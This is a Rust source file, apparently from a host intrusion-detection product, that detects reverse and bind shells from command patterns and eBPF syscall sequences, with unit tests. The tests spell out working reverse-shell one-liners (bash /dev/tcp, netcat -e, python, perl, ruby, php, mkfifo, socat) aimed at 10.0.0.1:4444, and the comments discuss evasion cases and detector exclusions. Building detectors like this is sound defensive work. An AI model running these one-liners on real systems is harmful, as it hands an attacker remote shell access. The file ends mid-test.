use std::collections::HashMap;

use chrono::{DateTime, Duration, Utc};
use innerwarden_core::{entities::EntityRef, event::Event, event::Severity, incident::Incident};

/// Detects reverse shell patterns via two methods:
///
/// 1. **Command pattern matching** (existing) — regex-like detection of known
///    reverse shell commands in `shell.command_exec` events.
///
/// 2. **eBPF sequence detection** (new) — correlates `network.outbound_connect` +
///    `process.fd_redirect` (dup2 stdin/stdout to socket) events by PID.
///    Also detects bind shells: `network.bind_listen` + `network.listen` +
///    `process.fd_redirect`.
pub struct ReverseShellDetector {
    host: String,
    cooldown: Duration,
    /// Suppress re-alerts per (command_hash) within cooldown window.
    alerted: HashMap<u64, DateTime<Utc>>,
    /// Track recent network events by PID for sequence detection.
    /// PID → (event_kind, timestamp, dst_ip, dst_port)
    pid_network_events: HashMap<u32, Vec<PidNetworkEvent>>,
}

#[derive(Clone)]
struct PidNetworkEvent {
    kind: String,
    ts: DateTime<Utc>,
    dst_ip: String,
    dst_port: u16,
    /// 2026-05-01: comm captured at THIS event's time. Pre-fix the
    /// reverse_shell incident only carried the comm of the
    /// fd_redirect event, which arrives slightly after the connect
    /// — and on prod (incident reverse_shell:ebpf_reverse_shell:
    /// 3815134:2026-05-01T01:51Z) the fd_redirect comm came back
    /// as garbage bytes ("\u{0}..\u{5}") even though the connect's
    /// comm was correctly "ssh". Storing comm at connect-time means
    /// the NSS-init exclusion below has reliable signal even when
    /// the kernel's task->comm has been overwritten by the time
    /// fd_redirect fires.
    comm: String,
}

impl ReverseShellDetector {
    pub fn new(host: impl Into<String>, cooldown_seconds: u64) -> Self {
        Self {
            host: host.into(),
            cooldown: Duration::seconds(cooldown_seconds as i64),
            alerted: HashMap::new(),
            pid_network_events: HashMap::new(),
        }
    }

    /// Returns the matched pattern name if the command looks like a reverse shell.
    fn detect_pattern(cmd: &str) -> Option<&'static str> {
        let lower = cmd.to_lowercase();

        // Bash reverse shell: /dev/tcp/ or /dev/udp/
        if lower.contains("/dev/tcp/") || lower.contains("/dev/udp/") {
            return Some("bash_dev_tcp");
        }

        // Netcat variants: nc -e, ncat -e, nc -c, netcat -e.
        //
        // Use word-boundary (whitespace-tokenized) matching, not substring.
        // The naive `contains("nc ")` check matches `rsync ` (which ends in
        // "nc ") and `contains(" -c ")` matches every `bash -c …` wrapper,
        // so a plain `bash -c rsync --server` was being classified as a
        // Critical netcat_shell reverse shell. Observed 2026-04-11 as
        // dozens of Critical FPs per day from the operator's own deploy
        // rsync-over-ssh.
        //
        // Coverage preserved:
        //   - OpenBSD netcat: `nc -e /bin/sh attacker 1234`
        //   - GNU netcat:     `nc -c /bin/sh attacker 1234`
        //   - Nmap ncat:      `ncat -e /bin/sh …` and `ncat -c '…'`
        //   - Full binary:    `netcat -e …` / `netcat -c …`
        //
        // Because `has_nc_binary` now requires an exact whitespace-token
        // match for `nc` / `ncat` / `netcat`, the `-c` flag can safely be
        // matched again — `bash -c rsync` contains no such token and no
        // longer trips the pattern. Additionally, the eBPF sequence
        // detector (`check_ebpf_sequence`) catches reverse shells by
        // behavior (connect + fd_redirect stdin/stdout to socket) even if
        // the command matcher misses an exotic variant, giving this
        // detector two independent layers.
        let tokens: Vec<&str> = lower.split_whitespace().collect();
        let has_nc_binary = tokens
            .iter()
            .any(|&t| t == "nc" || t == "ncat" || t == "netcat");
        let has_exec_flag = tokens.iter().any(|&t| t == "-e" || t == "-c");
        if has_nc_binary && has_exec_flag {
            return Some("netcat_shell");
        }

        // Python reverse shell: python + socket + connect
        if (lower.contains("python") || lower.contains("python3") || lower.contains("python2"))
            && lower.contains("socket")
            && lower.contains("connect")
        {
            return Some("python_reverse_shell");
        }

        // Perl reverse shell: perl + socket + INET
        if lower.contains("perl") && lower.contains("socket") && lower.contains("inet") {
            return Some("perl_reverse_shell");
        }

        // Ruby reverse shell: ruby + TCPSocket
        if lower.contains("ruby") && lower.contains("tcpsocket") {
            return Some("ruby_reverse_shell");
        }

        // PHP reverse shell: php + fsockopen
        if lower.contains("php") && lower.contains("fsockopen") {
            return Some("php_reverse_shell");
        }

        // mkfifo pipe: mkfifo + nc
        if lower.contains("mkfifo") && (lower.contains("nc ") || lower.contains("ncat ")) {
            return Some("mkfifo_pipe");
        }

        // Socat shell: socat + exec + tcp
        if lower.contains("socat") && lower.contains("exec") && lower.contains("tcp") {
            return Some("socat_shell");
        }

        None
    }

    /// Check eBPF event sequences for reverse/bind shell patterns.
    ///
    /// Reverse shell: connect(dst_ip:port) + fd_redirect(stdin/stdout) within 10s
    /// Bind shell: bind_listen + listen + fd_redirect(stdin/stdout) within 10s
    fn check_ebpf_sequence(&mut self, event: &Event) -> Option<Incident> {
        let pid = event.details.get("pid").and_then(|v| v.as_u64())? as u32;
        let comm = event
            .details
            .get("comm")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");
        let now = event.ts;

        // Self-exclusion: InnerWarden's OWN agent/ctl legitimately connect out
        // (Telegram notifications, the dashboard API, threat-feed polling) and
        // dup2 fds, and that connect + fd_redirect shape self-false-fired
        // `ebpf_reverse_shell` on the product's own egress — observed 126
        // Critical self-flags / 30 min to Telegram (149.154.166.x) on test001,
        // with `innerwarden-age` / `innerwarden` as the source comm. Verified via
        // `/proc/<pid>/exe` (NOT the forgeable comm): a process that merely sets
        // comm=innerwarden-* but whose exe is /tmp still fires — no blind spot.
        // Checked on the reliable connect-time comm; skipping the connect means a
        // later fd_redirect finds no recorded connect and cannot fire either.
        if super::is_verified_infra_process(comm, pid, &["innerwarden"]) {
            return None;
        }

        // Cloud guest-agent downgrade: on a cloud VM the platform's own agent
        // (Azure WALinuxAgent / ExtHandler) opens control-plane sockets (e.g. the
        // WireServer 168.63.129.16) and redirects fds in a shape that trips
        // `ebpf_reverse_shell` — observed ~992+ Critical FP/hour from `ExtHandler`
        // on an Azure k8s node, saturating the sensor event channel (shed-load).
        //
        // The short-lived guest-agent CHILD (`ExtHandler`) usually EXITS before
        // this userspace detector runs, so its own `/proc` is gone and identity
        // can't be resolved from the child pid. Fall back to its LONG-LIVED
        // PARENT — `WALinuxAgent ... -run-exthandlers` — which the collector
        // enriches as `ppid` on the fd_redirect (the event that EMITS the
        // incident) and whose `/proc` lineage still resolves. Identity stays
        // NON-FORGEABLE (real /proc lineage of the alive parent). `uid` is not
        // present on every eBPF event (the fd_redirect omits it), so default it
        // to 0 rather than SKIP the whole gate; `is_guest_agent` still requires a
        // DMI-detected cloud VM + a real root-owned guest-agent lineage, so the
        // default cannot let a `/tmp` or non-root process through. Downgrade-only.
        let uid = event
            .details
            .get("uid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0);
        let ppid = event.details.get("ppid").and_then(|v| v.as_u64());
        let is_guest = crate::cloud_platform::is_guest_agent(pid, uid as u32)
            || ppid.is_some_and(|pp| {
                pp != 0 && crate::cloud_platform::is_guest_agent(pp as u32, uid as u32)
            });
        if is_guest {
            return None;
        }

        // Record this event for the PID
        let dst_ip = event
            .details
            .get("dst_ip")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let dst_port = event
            .details
            .get("dst_port")
            .or_else(|| event.details.get("port"))
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u16;

        {
            let pid_events = self.pid_network_events.entry(pid).or_default();
            // Expire old events (>30s)
            pid_events.retain(|e| now - e.ts < Duration::seconds(30));
            pid_events.push(PidNetworkEvent {
                kind: event.kind.clone(),
                ts: now,
                dst_ip: dst_ip.clone(),
                dst_port,
                comm: comm.to_string(),
            });
        }

        // Only check on fd_redirect — that's the final step
        if event.kind != "process.fd_redirect" {
            return None;
        }

        // Check: is this redirecting stdin (0) or stdout (1)?
        let newfd = event
            .details
            .get("newfd")
            .and_then(|v| v.as_u64())
            .unwrap_or(99);
        if newfd > 2 {
            return None; // Not redirecting stdio
        }

        // Fork-aware correlation (evasion audit E4): a reverse shell can connect()
        // in the PARENT then fork() and dup2() the socket onto stdio in the CHILD
        // (classic socat / `python: fork; in child dup2+exec`). The connect is then
        // recorded under the parent pid while the fd_redirect arrives under the
        // child pid, so a strict per-pid match (the old behaviour) never fired. We
        // correlate over THIS pid's ring UNION its PARENT's ring. ppid is enriched
        // onto the fd_redirect event by the collector (stdio dups only).
        let ppid = event
            .details
            .get("ppid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let mut combined: Vec<PidNetworkEvent> = self
            .pid_network_events
            .get(&pid)
            .cloned()
            .unwrap_or_default();
        if ppid != 0 && ppid != pid {
            if let Some(parent) = self.pid_network_events.get(&ppid) {
                combined.extend(parent.iter().cloned());
            }
        }

        // Check for reverse shell: connect + fd_redirect
        let has_connect = combined
            .iter()
            .any(|e| e.kind == "network.outbound_connect");

        // Check for bind shell: bind_listen + listen + fd_redirect
        let has_bind = combined.iter().any(|e| e.kind == "network.bind_listen");
        let has_listen = combined.iter().any(|e| e.kind == "network.listen");

        let (pattern, target_ip, target_port, source_comm) = if has_connect {
            // Reverse shell detected
            let conn = combined
                .iter()
                .find(|e| e.kind == "network.outbound_connect")?;
            (
                "ebpf_reverse_shell",
                conn.dst_ip.clone(),
                conn.dst_port,
                conn.comm.clone(),
            )
        } else if has_bind && has_listen {
            // Bind shell detected
            let bind = combined.iter().find(|e| e.kind == "network.bind_listen")?;
            (
                "ebpf_bind_shell",
                bind.dst_ip.clone(),
                bind.dst_port,
                bind.comm.clone(),
            )
        } else {
            return None;
        };

        // Self-traffic guard: connection to this host's own IP is inter-service
        // communication, not a reverse shell (e.g., agent → localhost honeypot).
        // Note: we only filter own_ips, NOT all internal IPs — a reverse shell
        // to another internal host is real lateral movement and must alert.
        if !target_ip.is_empty() && super::is_own_ip(&target_ip) {
            return None;
        }

        // 2026-05-01: NSS-init operator-tool exclusion. The ssh client
        // (and scp/sftp/rsync/git-over-ssh) does `dup2(socket,
        // stdin/stdout)` to multiplex shell I/O over the SSH socket.
        // From the kernel's POV this is bit-identical to a reverse
        // shell — connect+fd_redirect — but the operator running
        // `git fetch` is not under attack.
        //
        // The exclusion is INTENTIONALLY NARROW:
        //   - source_comm comes from the CONNECT event (reliable;
        //     fd_redirect's comm was observed corrupted in prod
        //     incident 2026-05-01 01:51 UTC).
        //   - target_port must be 22 (SSH) — anything else (4444,
        //     1337, random high-port C2) is real reverse-shell
        //     territory and STILL fires.
        //   - source_comm prefix must match a known SSH-family
        //     client. An attacker renaming their malicious binary
        //     to "ssh" still has to also pick port 22, AND the
        //     downstream agent dismiss filter still requires UID
        //     in operator range.
        //
        // Aligned with `data_exfil_ebpf::NSS_INIT_CLI_TOOLS` so a
        // single git+ssh+github FP doesn't fire a different detector
        // every time we close one path.
        const REVERSE_SHELL_NSS_TOOLS: &[&str] =
            &["ssh", "scp", "sftp", "rsync", "git", "git-remote"];
        let comm_match = REVERSE_SHELL_NSS_TOOLS
            .iter()
            .any(|p| source_comm == *p || source_comm.starts_with(p));
        if comm_match && target_port == 22 {
            return None;
        }

        // 2026-06-29: HTTP/download-client exclusion. wget / curl (and friends)
        // connect to a web server and dup2 the socket onto stdio to stream the
        // body — bit-identical to a reverse shell from the kernel's POV, but
        // `curl https://...` is not an attack. This is the single most common
        // false positive: ANY box (not just AI-agent boxes) running wget/curl
        // gets flooded with Critical `ebpf_reverse_shell`. Observed on test001:
        // busybox `wget http://1.1.1.1` -> connect:80 + fd_redirect(0) ->
        // Critical, source_comm=wget.
        //
        // Same shape, same risk model, and INTENTIONALLY as narrow as the SSH
        // exclusion above:
        //   - source_comm comes from the CONNECT event (reliable).
        //   - target_port must be a standard web port — a "wget" connecting to
        //     4444 / 1337 / a random high C2 port still fires (real reverse
        //     shells do not live on :443; a renamed binary cannot fake the
        //     kernel-reported destination port).
        //   - defence in depth: a genuinely malicious download is still seen by
        //     c2_callback / c2_web_tunnel / process_tree / the agent context
        //     gate; this only stops the connect+dup2 *shape* from self-flagging.
        const REVERSE_SHELL_HTTP_CLIENTS: &[&str] = &[
            "wget", "curl", "aria2c", "axel", "lynx", "links", "w3m", "fetch", "http", "https",
        ];
        let http_client_match = REVERSE_SHELL_HTTP_CLIENTS
            .iter()
            .any(|p| source_comm == *p || source_comm.starts_with(p));
        let web_port = matches!(target_port, 80 | 443 | 8080 | 8443 | 8000 | 8888);
        if http_client_match && web_port {
            return None;
        }

        // Cooldown check
        let key = Self::hash_command(&format!("{pattern}:{pid}"));
        if let Some(&last) = self.alerted.get(&key) {
            if now - last < self.cooldown {
                return None;
            }
        }
        self.alerted.insert(key, now);

        // Clear tracked events for this PID
        self.pid_network_events.remove(&pid);

        // Prune stale PID entries
        if self.pid_network_events.len() > 5000 {
            let cutoff = now - Duration::seconds(30);
            self.pid_network_events.retain(|_, events| {
                events.retain(|e| e.ts > cutoff);
                !events.is_empty()
            });
        }

        let severity = Severity::Critical;
        let target_display = if target_ip.is_empty() {
            format!("port {target_port}")
        } else {
            format!("{target_ip}:{target_port}")
        };

        let mut entities = vec![];
        if !target_ip.is_empty() {
            entities.push(EntityRef::ip(&target_ip));
        }

        // 2026-05-01 (audit finding 1.7): the user-visible title and
        // summary previously interpolated `comm` (the fd_redirect-time
        // value), which is unreliable on some kernels and was
        // observed in prod as Unicode replacement characters
        // ("process ◆◆ (pid=...)"). The auditor saw this on the
        // dashboard and could not identify the actual reverse-shell
        // binary. `source_comm` is captured at the connect event
        // time and is reliable; prefer it for the operator-visible
        // strings, falling back to `comm` only when source_comm is
        // empty (older sensor that did not yet emit it).
        let display_comm = if source_comm.is_empty() {
            comm.to_string()
        } else {
            source_comm.clone()
        };
        Some(Incident {
            ts: now,
            host: self.host.clone(),
            incident_id: format!(
                "reverse_shell:{pattern}:{pid}:{}",
                now.format("%Y-%m-%dT%H:%MZ")
            ),
            severity,
            title: format!(
                "Reverse shell detected via eBPF ({pattern}): {display_comm} → {target_display}"
            ),
            summary: format!(
                "eBPF syscall sequence detected {pattern}: process {display_comm} (pid={pid}) \
                 established connection to {target_display} then redirected fd {newfd} to socket. \
                 This is a definitive reverse/bind shell — detected at kernel level."
            ),
            evidence: serde_json::json!([{
                "kind": "reverse_shell",
                "pattern": pattern,
                "detection": "ebpf_sequence",
                // 2026-05-01: emit BOTH the fd_redirect-time comm
                // (legacy field, may be corrupted on some kernels)
                // AND the connect-time comm (reliable). Downstream
                // dismiss filters should prefer source_comm.
                "comm": comm,
                "source_comm": source_comm,
                "pid": pid,
                "target_ip": target_ip,
                "target_port": target_port,
                "redirected_fd": newfd,
            }]),
            recommended_checks: vec![
                format!("Kill process immediately: kill -9 {pid}"),
                format!("Block attacker IP: {target_display}"),
                "Check for lateral movement from this host".to_string(),
                "Review process tree: who spawned this shell?".to_string(),
            ],
            tags: vec![
                "reverse_shell".to_string(),
                "ebpf".to_string(),
                "post_exploitation".to_string(),
            ],
            entities,
        })
    }

    /// Simple hash for cooldown keying - avoids storing full command strings.
    fn hash_command(cmd: &str) -> u64 {
        use std::hash::{Hash, Hasher};
        let mut hasher = std::collections::hash_map::DefaultHasher::new();
        cmd.hash(&mut hasher);
        hasher.finish()
    }

    pub fn process(&mut self, event: &Event) -> Option<Incident> {
        // ── eBPF sequence detection ────────────────────────────────────
        // Track connect/bind/listen/fd_redirect events by PID to detect
        // reverse shells and bind shells at the syscall level.
        if event.kind == "network.outbound_connect"
            || event.kind == "network.bind_listen"
            || event.kind == "network.listen"
            || event.kind == "process.fd_redirect"
        {
            if let Some(incident) = self.check_ebpf_sequence(event) {
                return Some(incident);
            }
            return None;
        }

        if event.kind != "shell.command_exec" && event.kind != "process.exec" {
            return None;
        }

        let command = event.details.get("command").and_then(|v| v.as_str());
        let args = event.details.get("args").and_then(|v| v.as_str());

        // Check both command and args fields; combine for pattern matching
        let text = match (command, args) {
            (Some(c), Some(a)) => format!("{c} {a}"),
            (Some(c), None) => c.to_string(),
            (None, Some(a)) => a.to_string(),
            (None, None) => return None,
        };

        if text.is_empty() {
            return None;
        }

        let pattern = Self::detect_pattern(&text)?;

        let now = event.ts;
        let key = Self::hash_command(&text);

        // Cooldown check
        if let Some(&last) = self.alerted.get(&key) {
            if now - last < self.cooldown {
                return None;
            }
        }
        self.alerted.insert(key, now);

        let pid = event
            .details
            .get("pid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let uid = event
            .details
            .get("uid")
            .and_then(|v| v.as_u64())
            .unwrap_or(0) as u32;
        let comm = event
            .details
            .get("comm")
            .and_then(|v| v.as_str())
            .unwrap_or("unknown");

        // Truncate command for display
        let display_cmd = if text.len() > 200 {
            format!("{}...", &text[..200])
        } else {
            text.clone()
        };

        // Prune stale entries
        if self.alerted.len() > 1000 {
            let cutoff = now - self.cooldown;
            self.alerted.retain(|_, ts| *ts > cutoff);
        }

        Some(Incident {
            ts: now,
            host: self.host.clone(),
            incident_id: format!(
                "reverse_shell:{pattern}:{pid}:{}",
                now.format("%Y-%m-%dT%H:%MZ")
            ),
            severity: Severity::Critical,
            title: format!("Reverse shell detected ({pattern}): {display_cmd}"),
            // 2026-05-03 (CodeQL alert #144 / `rust/cleartext-logging`):
            // `uid` flows from `event.details["uid"]` (sensor input,
            // CodeQL-tagged as user-controlled) into the human-readable
            // `summary` string, which is then persisted to the
            // `incidents-YYYY-MM-DD.jsonl` log on disk. Even though the
            // file is mode 600 in prod and `uid` is not OWASP-sensitive
            // (it is a process attribute, not a credential), the
            // duplication is unnecessary: `uid` already lives in
            // `evidence.uid` below as a structured field for downstream
            // tooling. Drop it from the operator-facing summary; the
            // JSONL evidence still carries the value for forensics.
            summary: format!(
                "Reverse shell pattern '{pattern}' detected in process {comm} \
                 (pid={pid}): {display_cmd}"
            ),
            evidence: serde_json::json!([{
                "kind": "reverse_shell",
                "pattern": pattern,
                "comm": comm,
                "pid": pid,
                "uid": uid,
                "command": text,
            }]),
            recommended_checks: vec![
                format!("Kill process immediately: kill -9 {pid}"),
                format!("Investigate parent process: ps -o ppid= -p {pid}"),
                "Check for network connections: ss -tunp".to_string(),
                "Review user account for compromise".to_string(),
                "Check for persistence mechanisms: crontab -l, ~/.bashrc, /etc/cron.d/".to_string(),
            ],
            tags: vec!["reverse_shell".to_string(), "post_exploitation".to_string()],
            entities: vec![],
        })
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn exec_event(command: &str, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "shell.command_exec".to_string(),
            severity: Severity::Info,
            summary: format!("Shell command: {command}"),
            details: serde_json::json!({
                "pid": 1234,
                "uid": 1000,
                "ppid": 1,
                "comm": "bash",
                "command": command,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    fn process_exec_event(command: &str, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "process.exec".to_string(),
            severity: Severity::Info,
            summary: format!("Process exec: {command}"),
            details: serde_json::json!({
                "pid": 5678,
                "uid": 0,
                "ppid": 1,
                "comm": "sh",
                "command": command,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    #[test]
    fn detects_bash_dev_tcp() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&exec_event("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", now))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("bash_dev_tcp"));
    }

    #[test]
    fn detects_bash_dev_udp() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&exec_event("bash -i >& /dev/udp/10.0.0.1/53 0>&1", now))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("bash_dev_tcp"));
    }

    #[test]
    fn detects_netcat_e() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&exec_event("nc -e /bin/sh 10.0.0.1 4444", now))
            .unwrap();
        assert_eq!(inc.severity, Severity::Critical);
        assert!(inc.title.contains("netcat_shell"));
    }

    #[test]
    fn detects_ncat_e() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det.process(&exec_event("ncat -e /bin/bash 10.0.0.1 4444", now));
        assert!(inc.is_some());
    }

    #[test]
    fn detects_nc_c() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let inc = det
            .process(&exec_event("nc -c /bin/sh 10.0.0.1 4444", now))
            .unwrap();
        assert!(inc.title.contains("netcat_shell"));
    }

    #[test]
    fn detects_python_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.0.0.1\",4444));os.dup2(s.fileno(),0)'";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("python_reverse_shell"));
    }

    #[test]
    fn detects_perl_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "perl -e 'use Socket;$i=\"10.0.0.1\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)))'";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("perl_reverse_shell"));
    }

    #[test]
    fn detects_ruby_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "ruby -rsocket -e 'f=TCPSocket.open(\"10.0.0.1\",4444).to_i'";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("ruby_reverse_shell"));
    }

    #[test]
    fn detects_php_reverse_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("php_reverse_shell"));
    }

    #[test]
    fn detects_mkfifo_pipe() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "mkfifo /tmp/f; nc 10.0.0.1 4444 < /tmp/f | /bin/sh > /tmp/f 2>&1";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("mkfifo_pipe"));
    }

    #[test]
    fn detects_socat_shell() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444";
        let inc = det.process(&exec_event(cmd, now)).unwrap();
        assert!(inc.title.contains("socat_shell"));
    }

    #[test]
    fn cooldown_suppresses_duplicate() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        assert!(det.process(&exec_event(cmd, now)).is_some());
        assert!(det
            .process(&exec_event(cmd, now + Duration::seconds(10)))
            .is_none());
    }

    #[test]
    fn fires_again_after_cooldown() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
        assert!(det.process(&exec_event(cmd, now)).is_some());
        assert!(det
            .process(&exec_event(cmd, now + Duration::seconds(301)))
            .is_some());
    }

    #[test]
    fn ignores_normal_commands() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        assert!(det.process(&exec_event("ls -la /tmp", now)).is_none());
        assert!(det
            .process(&exec_event("curl https://example.com", now))
            .is_none());
        assert!(det
            .process(&exec_event("python3 -m http.server", now))
            .is_none());
        assert!(det.process(&exec_event("nc -l -p 8080", now)).is_none());
    }

    #[test]
    fn ignores_irrelevant_event_kinds() {
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        let event = Event {
            ts: now,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "file.write_access".to_string(),
            severity: Severity::Info,
            summary: "file write".to_string(),
            details: serde_json::json!({
                "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
            }),
            tags: vec![],
            entities: vec![],
        };
        assert!(det.process(&event).is_none());
    }

    // ── eBPF sequence detection tests ──

    fn connect_event(pid: u32, dst_ip: &str, dst_port: u16, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "network.outbound_connect".to_string(),
            severity: Severity::Info,
            summary: format!("connect to {dst_ip}:{dst_port}"),
            details: serde_json::json!({
                "pid": pid, "uid": 0, "comm": "bash",
                "dst_ip": dst_ip, "dst_port": dst_port,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    fn fd_redirect_event(pid: u32, oldfd: u32, newfd: u32, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "process.fd_redirect".to_string(),
            severity: Severity::High,
            summary: format!("fd {oldfd} → {newfd}"),
            details: serde_json::json!({
                "pid": pid, "uid": 0, "comm": "bash",
                "oldfd": oldfd, "newfd": newfd,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }
    /// fd_redirect carrying a parent pid (the collector enriches this from
    /// /proc for stdio dups) — used for the fork()'d reverse-shell case.
    fn fd_redirect_event_ppid(
        pid: u32,
        oldfd: u32,
        newfd: u32,
        ppid: u32,
        ts: DateTime<Utc>,
    ) -> Event {
        let mut ev = fd_redirect_event(pid, oldfd, newfd, ts);
        ev.details["ppid"] = serde_json::json!(ppid);
        ev
    }

    fn bind_event(pid: u32, port: u16, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "network.bind_listen".to_string(),
            severity: Severity::High,
            summary: format!("bind to 0.0.0.0:{port}"),
            details: serde_json::json!({
                "pid": pid, "uid": 0, "comm": "nc",
                "dst_ip": "0.0.0.0", "port": port,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    fn listen_event(pid: u32, ts: DateTime<Utc>) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "network.listen".to_string(),
            severity: Severity::High,
            summary: "listen".to_string(),
            details: serde_json::json!({
                "pid": pid, "uid": 0, "comm": "nc",
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    fn connect_event_with_comm(
        pid: u32,
        dst_ip: &str,
        dst_port: u16,
        comm: &str,
        ts: DateTime<Utc>,
    ) -> Event {
        Event {
            ts,
            host: "test".to_string(),
            source: "ebpf".to_string(),
            kind: "network.outbound_connect".to_string(),
            severity: Severity::Info,
            summary: format!("connect to {dst_ip}:{dst_port}"),
            details: serde_json::json!({
                "pid": pid, "uid": 1001, "comm": comm,
                "dst_ip": dst_ip, "dst_port": dst_port,
            }),
            tags: vec!["ebpf".to_string()],
            entities: vec![],
        }
    }

    #[test]
    fn ebpf_reverse_shell_does_not_fire_on_ssh_to_port_22() {
        // 2026-05-01 (PR #047): operator-reported FP. `git fetch` /
        // direct ssh to a server multiplexes shell I/O over the SSH
        // socket via dup2(socket, stdin/stdout) — bit-identical to a
        // reverse shell from the kernel's POV, but the operator is
        // not under attack. Sensor must filter when comm is in the
        // NSS-init operator-tool set AND target_port is 22.
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        det.process(&connect_event_with_comm(
            7000,
            "20.26.156.215",
            22,
            "ssh",
            now,
        ));
        let inc = det.process(&fd_redirect_event(7000, 5, 0, now + Duration::seconds(1)));
        assert!(
            inc.is_none(),
            "ssh + connect + fd_redirect on port 22 must be suppressed"
        );
    }

    #[test]
    fn ebpf_reverse_shell_does_not_fire_on_wget_to_web_port() {
        // 2026-06-29: the #1 false positive. wget/curl connect to a web server
        // and dup2 the socket onto stdio to stream the body — bit-identical to a
        // reverse shell. Observed on test001: busybox `wget http://1.1.1.1` ->
        // connect:80 + fd_redirect(0) -> Critical. Must be suppressed for known
        // HTTP clients on a standard web port.
        for (comm, port) in [("wget", 80u16), ("curl", 443), ("wget", 8080)] {
            let mut det = ReverseShellDetector::new("test", 300);
            let now = Utc::now();
            det.process(&connect_event_with_comm(7100, "1.1.1.1", port, comm, now));
            let inc = det.process(&fd_redirect_event(7100, 5, 0, now + Duration::seconds(1)));
            assert!(
                inc.is_none(),
                "{comm} connect+fd_redirect to web port {port} must be suppressed"
            );
        }
    }

    #[test]
    fn ebpf_reverse_shell_still_fires_on_wget_to_non_web_port() {
        // INTENTIONALLY narrow: a "wget" to a C2 port (4444/1337/random high)
        // is NOT a real download and still fires — an attacker renaming their
        // reverse shell to wget cannot also make the kernel report port 80.
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        det.process(&connect_event_with_comm(
            7101, "10.0.0.1", 4444, "wget", now,
        ));
        let inc = det
            .process(&fd_redirect_event(7101, 5, 0, now + Duration::seconds(1)))
            .expect("wget to a non-web C2 port must still fire");
        assert_eq!(inc.severity, Severity::Critical);
    }

    #[test]
    fn ebpf_reverse_shell_still_fires_on_ssh_to_non_22_port() {
        // The exclusion is INTENTIONALLY narrow: only port 22.
        // Real reverse shells use 4444 / 1337 / random high-ports
        // — those must STILL fire even with comm=ssh (an attacker
        // can rename their binary, but they can't make the kernel
        // misreport the destination port).
        let mut det = ReverseShellDetector::new("test", 300);
        let now = Utc::now();
        det.process(&connect_event_with_comm(7001, "10.0.0.1", 4444, "ssh", now));
        let inc = det
            .process(&fd_redirect_event(7001, 5, 0, now + Duration::seconds(1)))
            .expect("ssh to non-22 port must still fire");
        assert_eq!(inc.severity, Severity::Critical);
    }

    #[test]
